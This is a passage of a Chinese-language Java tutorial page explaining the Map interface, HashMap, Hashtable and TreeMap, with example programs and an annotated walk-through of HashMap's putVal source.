class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;no1&quot;</span>,<span class="string">&quot;卡卡西&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;no2&quot;</span>,<span class="string">&quot;鸣人&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;no1&quot;</span>,<span class="string">&quot;火影&quot;</span>); <span class="comment">// 当有相同的key，就等价于替换value, key还是原来的</span></span><br><span class="line">        map.put(<span class="string">&quot;no3&quot;</span>,<span class="string">&quot;火影&quot;</span>);</span><br><span class="line">        map.put(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        map.put(<span class="literal">null</span>,<span class="string">&quot;abc&quot;</span>); <span class="comment">// 当有相同的key，就等价于替换value, key还是原来的</span></span><br><span class="line">        map.put(<span class="string">&quot;no4&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        map.put(<span class="string">&quot;no5&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        map.put(<span class="number">6</span>,<span class="string">&quot;博人&quot;</span>);</span><br><span class="line">        map.put(<span class="keyword">new</span> <span class="title class_">Object</span>(),<span class="string">&quot;纲手&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(map);</span><br><span class="line"><span class="comment">//        通过get方法传入 key,返回对应的value</span></span><br><span class="line">        System.out.println(map.get(<span class="string">&quot;no2&quot;</span>));</span><br><span class="line">        System.out.println(map.get(<span class="number">6</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Map-接口常用方法"><a href="#Map-接口常用方法" class="headerlink" title="Map 接口常用方法"></a>Map 接口常用方法</h3><ol><li>put：添加</li><li>remove：根据键删除映射关系</li><li>get：根据键获取值</li><li>size：获取元素个数</li><li>isEmpty：判断个数是否为0</li><li>clear：清除</li><li>containsKey：查找键是否存在</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MapMethod</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        map 接口常用方法</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;卡卡西&quot;</span>,<span class="keyword">new</span> <span class="title class_">Book</span>(<span class="string">&quot;美少女战士&quot;</span>,<span class="number">100</span>));</span><br><span class="line">        map.put(<span class="string">&quot;卡卡西&quot;</span>,<span class="string">&quot;火影&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;鸣人&quot;</span>,<span class="string">&quot;佐助&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;博人&quot;</span>,<span class="string">&quot;佐助&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;纲手&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        map.put(<span class="literal">null</span>,<span class="string">&quot;大蛇丸&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;guoxiao&quot;</span>,<span class="string">&quot;sb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;map=&quot;</span>+map);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;=========&quot;</span>);</span><br><span class="line"><span class="comment">//        1. put：添加</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        2. remove：根据键删除映射关系</span></span><br><span class="line">        map.remove(<span class="literal">null</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;map=&quot;</span>+map);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        3. get：根据键获取值</span></span><br><span class="line">        System.out.println(<span class="string">&quot;=========&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">val</span> <span class="operator">=</span> map.get(<span class="string">&quot;guoxiao&quot;</span>);</span><br><span class="line">        System.out.println(val);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        4. size：获取元素个数</span></span><br><span class="line">        System.out.println(<span class="string">&quot;=========&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> map.size();</span><br><span class="line">        System.out.println(size);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        5. isEmpty：判断个数是否为0</span></span><br><span class="line">        System.out.println(<span class="string">&quot;=========&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">empty</span> <span class="operator">=</span> map.isEmpty();</span><br><span class="line">        System.out.println(empty);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        6. clear：清除</span></span><br><span class="line">        System.out.println(<span class="string">&quot;=========&quot;</span>);</span><br><span class="line">        map.clear();</span><br><span class="line">        System.out.println(<span class="string">&quot;map=&quot;</span>+map);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        7. containsKey：查找键是否存在</span></span><br><span class="line">        System.out.println(<span class="string">&quot;=========&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;lk&quot;</span>,<span class="string">&quot;wkliu&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">lk</span> <span class="operator">=</span> map.containsKey(<span class="string">&quot;lk&quot;</span>);</span><br><span class="line">        System.out.println(lk);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Book</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> num;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Book</span><span class="params">(String name, <span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.num = num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Map-接口的遍历方法"><a href="#Map-接口的遍历方法" class="headerlink" title="Map 接口的遍历方法"></a>Map 接口的遍历方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MapFor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;卡卡西&quot;</span>,<span class="string">&quot;火影&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;鸣人&quot;</span>,<span class="string">&quot;佐助&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;博人&quot;</span>,<span class="string">&quot;佐助&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;纲手&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        map.put(<span class="literal">null</span>,<span class="string">&quot;大蛇丸&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;guoxiao&quot;</span>,<span class="string">&quot;sb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        第一组：先取出所有key,再 通过key取出所有 value</span></span><br><span class="line">        <span class="type">Set</span> <span class="variable">keySet</span> <span class="operator">=</span> map.keySet();</span><br><span class="line"><span class="comment">//        (1) 增强for</span></span><br><span class="line">        System.out.println(<span class="string">&quot;=======第一种方式:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Object key : keySet) &#123;</span><br><span class="line">            System.out.println(key+<span class="string">&quot;-&quot;</span>+map.get(key));</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        (2) 迭代器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;=======第二种方式：&quot;</span>);</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> keySet.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span>  iterator.next();</span><br><span class="line">            System.out.println(key+<span class="string">&quot;-&quot;</span>+map.get(key));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        第二组：把所有的value取出</span></span><br><span class="line">        <span class="type">Collection</span> <span class="variable">values</span> <span class="operator">=</span> map.values();</span><br><span class="line"><span class="comment">//        3种方式</span></span><br><span class="line"><span class="comment">//        （1）：增强for</span></span><br><span class="line">        System.out.println(<span class="string">&quot;====第三种，增强for取出所有的value&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Object value : values) &#123;</span><br><span class="line">            System.out.println(value);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        (2): 迭代器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;====第四种，迭代器取出所有的value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator1</span> <span class="operator">=</span> values.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator1.hasNext()) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span>  iterator1.next();</span><br><span class="line">            System.out.println(value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        第三组：通过 EntrySet 获取 k-v</span></span><br><span class="line">        <span class="type">Set</span> <span class="variable">entrySet</span> <span class="operator">=</span> map.entrySet();</span><br><span class="line"><span class="comment">//        (1) 增强 for</span></span><br><span class="line">        System.out.println(<span class="string">&quot;=======第五种，entryset 增强for&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Object entry : entrySet) &#123;</span><br><span class="line"><span class="comment">//            将 entry 转成 Map.Entry</span></span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">m</span> <span class="operator">=</span> (Map.Entry) entry;</span><br><span class="line">            System.out.println(m.getKey()+<span class="string">&quot;-&quot;</span>+m.getValue());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        (2) 迭代器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;=======第种，entryset 迭代器&quot;</span>);</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator2</span> <span class="operator">=</span> entrySet.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator2.hasNext()) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">entry</span> <span class="operator">=</span>  iterator2.next();</span><br><span class="line"><span class="comment">//            向下转型</span></span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">m</span> <span class="operator">=</span> (Map.Entry) entry;</span><br><span class="line">            System.out.println(m.getKey()+<span class="string">&quot;-&quot;</span>+m.getValue()); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><ol><li>Map接口的常用实现类：HashMap、HashTable和Properties</li><li>HashMap是Map接口使用频率最高的实现类。</li><li>HashMap是以key-value对的方式来存储数据</li><li>Key不能重复，但是值可以重复，允许使用null键和null值</li><li>如果添加相同的key，则会覆盖原来的key-value，等同于修改（key不会替换，val会替换）</li><li>与HashSet一样，不保证映射的顺序，因为底层是以hash表的方式来存储的</li><li>HashMap没有实现同步，因此是线程不安全的，方法上没有做同步互斥操作，没有synchronized</li></ol><h3 id="HashMap-扩容机制及源码分析"><a href="#HashMap-扩容机制及源码分析" class="headerlink" title="HashMap 扩容机制及源码分析"></a>HashMap 扩容机制及源码分析</h3><p>扩容机制 【同HashSet相同】</p><ol><li>HashMap底层维护了Node类型的数组table，默认为null</li><li>当创建对象时，将加载因子（loadfactor)初始化为0.75</li><li>当添加 key-val时，通过key的哈希值得到在table的索引。然后判断该索引处是否有元素，如果没有元素直接添加。如果该索引处有元素，继续判断该元素的key是否和准备加入的key相同，如果相等，则直接替换value；如果不相等需要判断是树结构还是链表，做出相应处理。如果添加时发现容量不够，则需扩容。</li><li>第一次添加，则需要扩容table容量为16，临界值（threshold）为12 (16 *0.75)</li><li>以后再扩容，则需要扩容table容量为原来的2倍，临界值为原来的2倍，即24，依次类推</li><li>在Java8种，如果一条链表的元素个数超过 TREEIFY_THRESHOLD（默认是8）即插入第九个元素的时候，并且table的大小 &gt;&#x3D; MIN_TREEIEF_CAPACITY（默认是64），就会进行树化（红黑树）</li></ol><p>put源码分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Implements Map.put and related methods.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> hash hash for key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key the key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value the value to put</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> onlyIfAbsent if true, don&#x27;t change existing value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> evict if false, the table is in creation mode.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> previous value, or null if none</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">boolean</span> onlyIfAbsent,</span></span><br><span class="line"><span class="params">                   <span class="type">boolean</span> evict)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 定义辅助变量 tab、p、n、i</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="type">int</span> n, i;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// table 是hashMap的一个属性，类型是Node[]  存放 node节点的数组</span></span><br><span class="line">        <span class="comment">// 如果 table为null或者大小为0，执行resize()方法，table第一次扩容16个空间</span></span><br><span class="line">        <span class="keyword">if</span> ((tab = table) == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">            n = (tab = resize()).length;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 取出hash值对应的table的索引位置的Node，如果为null,就直接把加入的k-v，创建成一个Node,加入该位置即可</span></span><br><span class="line">        <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="literal">null</span>)</span><br><span class="line">            tab[i] = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Node&lt;K,V&gt; e; K k;</span><br><span class="line">            <span class="comment">// 如果 table的索引位置的key的hash和新的key的hash相同，</span></span><br><span class="line">            <span class="comment">// 并且满足（table现有的节点的key和准备添加的可以是同一个对象） 或者 equals返回真</span></span><br><span class="line">            <span class="comment">// 就认为不能加入新的 k-v</span></span><br><span class="line">            <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">                ((k = p.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                e = p;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode) <span class="comment">// 如果当前table的node已经是红黑树，就按照红黑树的方式处理</span></span><br><span class="line">                e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="built_in">this</span>, tab, hash, key, value);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果找到的节点，后面是链表，就循环比较</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">binCount</span> <span class="operator">=</span> <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((e = p.next) == <span class="literal">null</span>) &#123;  <span class="comment">// 如果整个链表，没有和他相同的，就加在该链表后</span></span><br><span class="line">                        p.next = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">                        <span class="comment">// 判断当前链表个数是否已经到8个，到8个后，进行红黑树的树化</span></span><br><span class="line">                        <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                            treeifyBin(tab, hash);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (e.hash == hash &amp;&amp;   <span class="comment">// 如果在循环比较过程种，如果有相同的，就直接break</span></span><br><span class="line">                        ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    p = e;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 替换 value</span></span><br><span class="line">            <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">                <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="literal">null</span>)</span><br><span class="line">                    e.value = value;</span><br><span class="line">                afterNodeAccess(e);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 操作次数,每增加一个Node,就size++</span></span><br><span class="line">        ++modCount;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 判断是否需要扩容，threshold为扩容操作临界值，默认为12，tab超过12执行扩容</span></span><br><span class="line">        <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">            resize();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//空方法，是HashMap 给其子类留的 让其子类执行一些操作</span></span><br><span class="line">        afterNodeInsertion(evict);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 放回 null,代表成功</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h2><h3 id="Hashtable基本介绍"><a href="#Hashtable基本介绍" class="headerlink" title="Hashtable基本介绍"></a>Hashtable基本介绍</h3><ol><li>存放的元素是键值对：K-V</li><li>Hashtable的键和值都不能为null，否则会抛出NullPointerException</li><li>Hashtable使用方法基本上和 hashMap一样</li><li>Hashtable是线程安全的(synchorized)，hashMap 是线程不安全的</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashTableExercise</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        table.put(<span class="string">&quot;john&quot;</span>,<span class="number">100</span>);</span><br><span class="line"><span class="comment">//        table.put(null,100);   //NullPointerException</span></span><br><span class="line"><span class="comment">//        table.put(&quot;join&quot;,null);  //NullPointerException</span></span><br><span class="line">        table.put(<span class="string">&quot;lucy&quot;</span>,<span class="number">100</span>);</span><br><span class="line">        table.put(<span class="string">&quot;lic&quot;</span>,<span class="number">100</span>);</span><br><span class="line">        table.put(<span class="string">&quot;lic&quot;</span>,<span class="number">80</span>); <span class="comment">// 替换</span></span><br><span class="line">        table.put(<span class="string">&quot;hello1&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        table.put(<span class="string">&quot;hello2&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        table.put(<span class="string">&quot;hello3&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        table.put(<span class="string">&quot;hello4&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        table.put(<span class="string">&quot;hello5&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        table.put(<span class="string">&quot;hello6&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        System.out.println(table);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Hashtable底层</span></span><br><span class="line"><span class="comment">//        1. 底层有一个数组 Hashtable$Entry[]  初始化大小为11</span></span><br><span class="line"><span class="comment">//        2. 临界值 threshold 8 = 11 * 0.75</span></span><br><span class="line"><span class="comment">//        3. 扩容：按照自己的扩容机制</span></span><br><span class="line"><span class="comment">//        4. 执行 addEntry(hash, key, value, index); 添加 k-v 封装到 Entry</span></span><br><span class="line"><span class="comment">//        5. 当 if(count &gt;= threshold) 满足时，就进行扩容</span></span><br><span class="line"><span class="comment">//        6. 按照 int newCapacity = (oldCapaticy &lt;&lt; 1 ) + 1;  [old*2+1]的大小扩容</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Hashtable-和HashMap-对比"><a href="#Hashtable-和HashMap-对比" class="headerlink" title="Hashtable 和HashMap 对比"></a>Hashtable 和HashMap 对比</h3><table><thead><tr><th></th><th>版本</th><th>线程安全（同步）</th><th>效率</th><th>允许null键null值</th></tr></thead><tbody><tr><td>HashMap</td><td>1.2</td><td>不安全</td><td>高</td><td>可以</td></tr><tr><td>Hashtable</td><td>1.0</td><td>安全</td><td>较低</td><td>不可以</td></tr></tbody></table><h2 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h2><p>唯一，有序（按照升序或降序排列）</p><h3 id="底层：二叉树"><a href="#底层：二叉树" class="headerlink" title="底层：二叉树"></a>底层：二叉树</h3><p>key遵照二叉树特点<br>key对应的类型内部一定要实现比较器（内部比较器，外部比较器自选）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TreeMap_</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//       使用默认构造器，创建TreeMap</span></span><br><span class="line"><span class="comment">//        TreeMap treeMap = new TreeMap();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TreeMap</span> <span class="variable">treeMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeMap</span>(<span class="keyword">new</span> <span class="title class_">Comparator</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line"><span class="comment">//                按照传入的 k(String) 的大小进行排序</span></span><br><span class="line"><span class="comment">//                return ((String) o2).compareTo((String) o1);</span></span><br><span class="line"><span class="comment">//                按照字符串长度大小排序</span></span><br><span class="line">                <span class="keyword">return</span> ((String) o1).length() - ((String) o2).length();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        treeMap.put(<span class="string">&quot;jack&quot;</span>,<span class="string">&quot;杰克&quot;</span>);</span><br><span class="line">        treeMap.put(<span class="string">&quot;tom&quot;</span>,<span class="string">&quot;汤姆&quot;</span>);</span><br><span class="line">        treeMap.put(<span class="string">&quot;wkliul&quot;</span>,<span class="string">&quot;拉拉&quot;</span>);</span><br><span class="line">        treeMap.put(<span class="string">&quot;smith&quot;</span>,<span class="string">&quot;史密斯&quot;</span>);</span><br><span class="line">        treeMap.put(<span class="string">&quot;smith&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        System.out.println(treeMap.size());</span><br><span class="line">        System.out.println(treeMap);</span><br><span 